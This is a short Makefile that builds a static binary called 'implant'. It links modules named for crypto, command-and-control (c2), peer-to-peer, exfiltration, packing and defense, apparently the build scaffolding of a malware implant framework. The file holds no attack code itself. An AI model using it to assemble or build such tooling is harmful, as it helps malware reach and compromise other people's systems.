CC      = gcc
CFLAGS  = -std=c11 -O2 -Wall -Wextra -fvisibility=hidden
MODS    = 00_crypto 02_c2 14_p2p 21_exfil 20_packer 19_defense
INC     = $(foreach m,$(MODS),-I../$(m)/include)
SRCS    = $(foreach m,$(MODS),$(wildcard ../$(m)/src/*.c))
OBJS    = $(patsubst ../%.c,obj/%.o,$(SRCS))

all: implant

$(shell mkdir -p $(foreach m,$(MODS),obj/$(m)/src))

obj/%.o: ../%.c
	$(CC) $(CFLAGS) $(INC) -c $< -o $@ 2>>build.log || echo "FAIL: $<" >> build.log

implant: $(OBJS) src/main.c
	$(CC) $(CFLAGS) $(INC) src/main.c $(OBJS) -o $@ -static 2>>build.log

clean:
	rm -rf obj implant build.log
